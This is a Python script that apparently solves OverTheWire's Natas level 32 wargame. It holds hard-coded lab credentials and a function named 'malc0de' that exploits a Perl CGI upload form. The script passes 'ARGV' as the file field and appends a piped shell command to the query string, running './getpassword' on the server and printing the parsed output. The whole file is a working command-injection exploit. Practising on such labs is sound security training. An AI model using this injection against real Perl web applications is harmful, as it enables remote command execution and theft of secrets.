import requests
import html

user = 'natas32'
passw = 'no1vohsheCaiv3ieH4em1ahchisainge'
url = 'http://%s.natas.labs.overthewire.org/' % user


def malc0de(cmd):
    injection_url = url + f'?{cmd} |'
    files = {'file': "test"}
    response = requests.post(injection_url,
                             files=files,
                             data={'file': 'ARGV', 'submit': 'Upload'},
                             auth=(user, passw),
                             #proxies={'http': 'http://127.0.0.1:8080'},
                             )
    return filter_response(response)


def filter_response(response):
    fltr = response.text[1522:]
    fltr = fltr[:-117]
    fltr = fltr.replace('</td></tr><tr><td>', '')
    fltr = fltr.replace('</th></tr><tr><td>', '')
    fltr = fltr.replace('ble table-hover table-striped"><tr><th>', '')
    fltr = html.unescape(fltr)
    return fltr


print(malc0de("./getpassword"))
